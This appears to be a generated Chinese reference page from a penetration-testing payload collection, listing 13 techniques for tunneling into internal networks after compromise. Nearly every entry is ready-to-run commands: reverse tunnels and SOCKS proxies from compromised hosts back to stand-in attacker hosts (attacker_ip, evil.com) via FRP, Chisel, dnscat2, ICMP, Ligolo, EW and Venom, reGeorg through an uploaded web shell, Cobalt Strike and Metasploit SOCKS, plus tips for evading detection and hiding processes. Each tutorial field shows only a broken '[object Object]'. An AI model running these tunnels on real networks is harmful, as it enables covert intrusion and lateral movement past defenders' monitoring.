# 隧道代理 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（13 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. FRP内网穿透

- **id:** `tunnel-frp`
- **分类:** 隧道代理 / TCP隧道
- **tags:** `frp` `tunnel` `proxy` `nat`

使用FRP建立内网穿透隧道

**前置条件**

- 公网服务器
- 内网机器可访问公网
- FRP工具

**利用步骤**

#### 服务端配置

```
[common]
bind_port = 7000
```

FRP服务端配置文件frps.ini

| 片段 | 说明 | 类型 |
|---|---|---|
| `bind_port` | 服务端监听端口 | parameter |

> platform: `linux`

#### 客户端配置

```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```

FRP客户端配置文件frpc.ini

| 片段 | 说明 | 类型 |
|---|---|---|
| `server_addr` | 服务端IP | parameter |
| `local_port` | 本地端口 | parameter |
| `remote_port` | 远程端口 | parameter |

> platform: `windows`

#### 启动服务端

```
./frps -c frps.ini
```

启动FRP服务端

> platform: `linux`

#### 启动客户端

```
frpc.exe -c frpc.ini
```

启动FRP客户端

> platform: `windows`

**OPSEC**

- FRP流量可能被检测
- 考虑使用加密传输
- 注意隐藏进程

**教程**

[object Object]

---

### 2. Chisel内网穿透

- **id:** `tunnel-chisel`
- **分类:** 隧道代理 / HTTP隧道
- **tags:** `chisel` `tunnel` `proxy` `http`

使用Chisel建立内网穿透隧道

**前置条件**

- 公网服务器
- 内网机器可访问公网
- Chisel工具

**利用步骤**

#### 服务端

```
./chisel server -p 8000 --reverse
```

启动Chisel服务端

| 片段 | 说明 | 类型 |
|---|---|---|
| `chisel server` | Chisel服务端模式 | command |
| `-p 8000` | 监听端口 | parameter |
| `--reverse` | 允许反向隧道 | parameter |

> platform: `linux`

#### 反向SOCKS

```
chisel.exe client attacker_ip:8000 R:socks
```

建立反向SOCKS代理

> platform: `windows`

#### 端口转发

```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

端口转发

> platform: `windows`

**OPSEC**

- Chisel使用HTTP协议
- 可以绑定域名伪装
- 流量加密

**教程**

[object Object]

---

### 3. ReGeorg隧道

- **id:** `tunnel-regeorg`
- **分类:** 隧道代理 / ReGeorg
- **tags:** `tunnel` `regeorg` `proxy`

通过Web Shell建立隧道

**前置条件**

- Web Shell上传
- 支持脚本语言

**利用步骤**

#### 上传隧道脚本

```
上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器
```

上传对应语言的隧道脚本

#### 建立隧道

```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```

启动SOCKS代理

| 片段 | 说明 | 类型 |
|---|---|---|
| `-p 1080` | 本地监听端口 | parameter |
| `-u http://target/tunnel.aspx` | 隧道脚本URL | parameter |

> platform: `linux`

#### 配置代理

```
proxychains nmap -sT -Pn target
```

通过代理扫描

> platform: `linux`

**教程**

[object Object]

---

### 4. SSH本地转发

- **id:** `tunnel-ssh-local`
- **分类:** 隧道代理 / SSH
- **tags:** `ssh` `tunnel` `local`

SSH本地端口转发

**前置条件**

- SSH访问权限

**利用步骤**

#### 本地转发

```
ssh -L 8080:target:80 user@jump
```

将目标80端口映射到本地8080

| 片段 | 说明 | 类型 |
|---|---|---|
| `-L 8080:target:80` | 本地转发：本地8080->target:80 | parameter |
| `user@jump` | SSH跳板机 | value |

> platform: `linux`

**教程**

[object Object]

---

### 5. SSH远程转发

- **id:** `tunnel-ssh-remote`
- **分类:** 隧道代理 / SSH
- **tags:** `ssh` `tunnel` `remote`

SSH远程端口转发

**前置条件**

- SSH访问权限

**利用步骤**

#### 远程转发

```
ssh -R 8080:localhost:80 user@jump
```

将本地80端口映射到远程8080

| 片段 | 说明 | 类型 |
|---|---|---|
| `-R 8080:localhost:80` | 远程转发：远程8080->本地80 | parameter |
| `user@jump` | SSH跳板机 | value |

> platform: `linux`

**教程**

[object Object]

---

### 6. SSH动态转发

- **id:** `tunnel-ssh-dynamic`
- **分类:** 隧道代理 / SSH
- **tags:** `ssh` `tunnel` `socks`

SSH动态SOCKS代理

**前置条件**

- SSH访问权限

**利用步骤**

#### 动态转发

```
ssh -D 1080 user@jump
```

创建SOCKS代理

| 片段 | 说明 | 类型 |
|---|---|---|
| `-D 1080` | 动态转发，创建SOCKS5代理 | parameter |
| `user@jump` | SSH跳板机 | value |

> platform: `linux`

#### 使用代理

```
proxychains nmap -sT -Pn target
```

通过SOCKS代理访问

> platform: `linux`

**教程**

[object Object]

---

### 7. DNS隧道

- **id:** `tunnel-dns`
- **分类:** 隧道代理 / DNS
- **tags:** `dns` `tunnel` `covert`

通过DNS协议建立隧道

**前置条件**

- DNS解析权限
- 可控域名

**利用步骤**

#### 使用dnscat2

```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

启动dnscat2服务器

> platform: `linux`

#### 客户端连接

```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

客户端连接到服务器

> platform: `windows`

#### 建立隧道

```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```

建立SOCKS隧道

> platform: `linux`

**教程**

[object Object]

---

### 8. ICMP隧道

- **id:** `tunnel-icmp`
- **分类:** 隧道代理 / ICMP
- **tags:** `icmp` `tunnel` `covert`

通过ICMP协议建立隧道

**前置条件**

- ICMP允许通过
- 管理员权限

**利用步骤**

#### 使用icmptunnel

```
icmptunnel -s 10.0.0.1
```

服务端启动

> platform: `linux`

#### 客户端连接

```
icmptunnel -c attacker.com
```

客户端连接

> platform: `linux`

**教程**

[object Object]

---

### 9. Ligolo隧道

- **id:** `tunnel-ligolo`
- **分类:** 隧道代理 / Ligolo
- **tags:** `ligolo` `tunnel` `proxy`

Ligolo内网穿透工具

**前置条件**

- 可执行代理程序

**利用步骤**

#### 启动服务端

```
sudo proxy -selfcert
```

启动Ligolo代理服务

> platform: `linux`

#### 运行代理

```
agent.exe -connect attacker:11601 -ignore-cert
```

目标机器运行代理

> platform: `windows`

#### 创建隧道

```
session
start
```

创建隧道接口

> platform: `linux`

**教程**

[object Object]

---

### 10. SOCKS代理

- **id:** `socks-proxy`
- **分类:** 隧道代理 / SOCKS
- **tags:** `socks` `proxy` `tunnel`

建立SOCKS代理访问内网

**前置条件**

- 已有内网访问点

**利用步骤**

#### SSH SOCKS代理

```
ssh -D 1080 user@jumpserver
或
ssh -D 1080 -N -f user@jumpserver
```

SSH动态端口转发

| 片段 | 说明 | 类型 |
|---|---|---|
| `-D 1080` | 本地SOCKS代理端口 | parameter |
| `-N` | 不执行远程命令 | parameter |
| `-f` | 后台运行 | parameter |

> platform: `linux`

#### ProxyChains配置

```
编辑 /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

使用:
proxychains nmap -sT target
```

配置ProxyChains

> platform: `linux`

#### Cobalt Strike SOCKS

```
beacon> socks 1080
在CS中启动SOCKS代理
```

CS SOCKS代理

> platform: `windows`

#### Metasploit SOCKS

```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

MSF SOCKS代理

> platform: `linux`

**教程**

[object Object]

---

### 11. Ngrok内网穿透

- **id:** `tunnel-ngrok`
- **分类:** 隧道代理 / Ngrok
- **tags:** `ngrok` `tunnel` `penetration`

使用Ngrok建立内网穿透

**前置条件**

- Ngrok账号
- 可访问外网

**利用步骤**

#### 安装Ngrok

```
下载: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

安装并配置Ngrok

#### HTTP隧道

```
./ngrok http 80
将本地80端口映射到公网
```

创建HTTP隧道

#### TCP隧道

```
./ngrok tcp 3389
将本地3389端口映射到公网
```

创建TCP隧道

| 片段 | 说明 | 类型 |
|---|---|---|
| `http` | HTTP协议隧道 | keyword |
| `tcp` | TCP协议隧道 | keyword |

#### 自定义域名

```
./ngrok http -hostname=custom.domain.com 80
```

使用自定义域名

**教程**

[object Object]

---

### 12. EW内网穿透

- **id:** `tunnel-ew`
- **分类:** 隧道代理 / EW
- **tags:** `ew` `tunnel` `socks`

使用EW建立内网穿透

**前置条件**

- 已有内网访问点

**利用步骤**

#### 正向代理

```
./ew -s ssocksd -l 1080
在跳板机上启动SOCKS代理
```

正向SOCKS代理

| 片段 | 说明 | 类型 |
|---|---|---|
| `-s ssocksd` | SOCKS服务模式 | parameter |
| `-l 1080` | 监听端口 | parameter |

> platform: `linux`

#### 反向代理

```
攻击机: ./ew -s rcsocks -l 1080 -e 8888
跳板机: ./ew -s rssocks -d attacker_ip -e 8888
```

反向SOCKS代理

> platform: `linux`

#### 多级级联

```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
多级跳板穿透
```

多级级联

> platform: `linux`

**教程**

[object Object]

---

### 13. Venom内网穿透

- **id:** `tunnel-venom`
- **分类:** 隧道代理 / Venom
- **tags:** `venom` `tunnel` `socks`

使用Venom建立内网穿透

**前置条件**

- 已有内网访问点

**利用步骤**

#### 启动服务端

```
./venom_server -lport 9999
在攻击机启动服务端
```

启动服务端

> platform: `linux`

#### 连接客户端

```
./venom_client -rhost attacker_ip -rport 9999
在跳板机连接服务端
```

连接服务端

| 片段 | 说明 | 类型 |
|---|---|---|
| `-rhost` | 服务端IP | parameter |
| `-rport` | 服务端端口 | parameter |

#### 建立SOCKS

```
 Venom > socks 1080
建立SOCKS代理
```

建立SOCKS代理

#### 端口转发

```
Venom > lforward 127.0.0.1 3389 13389
将内网3389转发到本地13389
```

端口转发

**教程**

[object Object]
